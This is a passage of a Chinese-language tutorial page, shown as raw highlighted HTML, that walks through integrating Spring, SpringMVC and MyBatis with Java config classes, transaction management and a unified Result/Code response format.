punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>80<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>path</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>path</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="162-创建config类"><a class="markdownIt-Anchor" href="#162-创建config类">#</a> 16.2 创建 config 类</h2><h3 id="1621-springconfig"><a class="markdownIt-Anchor" href="#1621-springconfig">#</a> 16.2.1 SpringConfig</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"com.itheima.service"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1622-整合mybatisjdbcconfigmybatisconfig"><a class="markdownIt-Anchor" href="#1622-整合mybatisjdbcconfigmybatisconfig">#</a> 16.2.2 整合 mybatis——JdbcConfig&amp;MybatisConfig</h3><ul><li>在 SpringConfig 中添加 properties 目录和导入的配置文件类</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"com.itheima.service"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@PropertySource</span><span class="token punctuation">(</span><span class="token string">"classpath:jdbc.properties"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Import</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">JdbcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">MybatisConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>resources 目录下写 jdbc.properties</li></ul><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">jdbc.driver</span><span class="token punctuation">=</span><span class="token value attr-value">com.mysql.jdbc.Driver</span><span class="token key attr-name">jdbc.url</span><span class="token punctuation">=</span><span class="token value attr-value">jdbc:mysql://localhost:3306/ssm_db</span><span class="token key attr-name">jdbc.username</span><span class="token punctuation">=</span><span class="token value attr-value">root</span><span class="token key attr-name">jdbc.password</span><span class="token punctuation">=</span><span class="token value attr-value">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>jdbcConfig</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span><span class="token class-name">DruidDataSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Value</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DataSource</span></span><span class="token punctuation">;</span><span class="token comment">//因为SpringConfig有了@PropertySource("jdbc.properties")，可以直接用@Value注解加载值</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.driver&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> driver<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.url&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.username&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.password&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">DruidDataSource</span> druidDataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> druidDataSource<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>MybatisConfig</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSession</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>mybatis<span class="token punctuation">.</span>spring<span class="token punctuation">.</span></span><span class="token class-name">SqlSessionFactoryBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>mybatis<span class="token punctuation">.</span>spring<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span></span><span class="token class-name">MapperScannerConfigurer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DataSource</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MybatisConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">SqlSessionFactoryBean</span> <span class="token function">sqlSessionFactory</span><span class="token punctuation">(</span><span class="token class-name">DataSource</span> dataSource<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">SqlSessionFactoryBean</span> factoryBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factoryBean<span class="token punctuation">.</span><span class="token function">setDataSource</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>        factoryBean<span class="token punctuation">.</span><span class="token function">setTypeAliasesPackage</span><span class="token punctuation">(</span><span class="token string">"com.itheima.domain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> factoryBean<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">MapperScannerConfigurer</span> <span class="token function">mapperScannerConfigurer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">MapperScannerConfigurer</span> msc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MapperScannerConfigurer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        msc<span class="token punctuation">.</span><span class="token function">setBasePackage</span><span class="token punctuation">(</span><span class="token string">"com.itheima.dao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> msc<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1623-整合springmvc"><a class="markdownIt-Anchor" href="#1623-整合springmvc">#</a> 16.2.3 整合 SpringMVC</h3><ul><li>SpringMVCConfig</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ComponentScan</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">EnableWebMvc</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.itheima.controller"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableWebMvc</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMvcConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ServletConfig</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">AbstractAnnotationConfigDispatcherServletInitializer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>logging<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletConfig</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractAnnotationConfigDispatcherServletInitializer</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getRootConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">SpringConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletConfigClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">SpringMvcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1624-事务整理"><a class="markdownIt-Anchor" href="#1624-事务整理">#</a> 16.2.4 事务整理</h3><ul><li><p>开启注解式事务驱动</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"com.itheima.service"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@PropertySource</span><span class="token punctuation">(</span><span class="token string">"classpath:jdbc.properties"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Import</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">JdbcConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">MybatisConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableTransactionManagement</span><span class="token comment">//开启注解式事务驱动</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写事务管理器</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span><span class="token class-name">DruidDataSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Value</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>datasource<span class="token punctuation">.</span></span><span class="token class-name">DataSourceTransactionManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>transaction<span class="token punctuation">.</span></span><span class="token class-name">PlatformTransactionManager</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DataSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.driver&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> driver<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.url&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.username&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;jdbc.password&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">DataSource</span> <span class="token function">dataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">DruidDataSource</span> druidDataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span>driver<span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>        druidDataSource<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> druidDataSource<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">PlatformTransactionManager</span> <span class="token function">platformTransactionManager</span><span class="token punctuation">(</span><span class="token class-name">DataSource</span> dataSource<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">DataSourceTransactionManager</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataSourceTransactionManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ds<span class="token punctuation">.</span><span class="token function">setDataSource</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ds<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在类挂载事务管理器</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Transactional</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="17-表现层数据封装-通信协议"><a class="markdownIt-Anchor" href="#17-表现层数据封装-通信协议">#</a> 17、表现层数据封装 - 通信协议</h1><ul><li>前端接收数据格式</li><li>增删改</li><li>查单条</li><li>查全部</li><li>前端接收数据格式 —— 创建结果模型类，封装数据到 data 属性中</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221006151614087.png" alt="image-20221006151614087"></p><ul><li>前端接收数据格式 —— 封装操作结果到 code 属性中</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221006151719230.png" alt="image-20221006151719230"></p><ul><li>前端接收数据格式 —— 封装特殊消息到 message (msg) 属性中</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221006151851147.png" alt="image-20221006151851147"></p><ul><li>设置统一数据返回结果类</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Result</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Object</span> data<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> code<span class="token punctuation">;</span>    <span class="token keyword">private</span><span class="token class-name">String</span> msg<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>注意：result 类中的字段并不是固定的，可以根据需要自行增减，提供若干个构造方法，方便操作</li></ul><h1 id="18-数据协议实现"><a class="markdownIt-Anchor" href="#18-数据协议实现">#</a> 18、数据协议实现</h1><ul><li>在 controller 包下创建 Result 类，提供三个属性，并提供多个构造方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Result</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Object</span> data<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> code<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> msg<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> data<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setData</span><span class="token punctuation">(</span><span class="token class-name">Object</span> data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCode</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> msg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token class-name">String</span> msg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>msg <span class="token operator">=</span> msg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token class-name">Object</span> data<span class="token punctuation">,</span> <span class="token class-name">Integer</span> code<span class="token punctuation">,</span> <span class="token class-name">String</span> msg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>msg <span class="token operator">=</span> msg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token class-name">Object</span> data<span class="token punctuation">,</span> <span class="token class-name">Integer</span> code<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在 controller 包下创建 Code 类，将所有的码值进行定义</li></ul><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">package com.itheima.controller;public class Code &#123;    public static final Integer SAVE_OK &#x3D; 20011;    public static final Integer DELETE_OK &#x3D; 20021;    public static final Integer UPDATE_OK &#x3D; 20031;    public static final Integer GET_OK &#x3D; 20041;    public static final Integer SAVE_ERR &#x3D; 20010;    public static final Integer DELETE_ERR &#x3D; 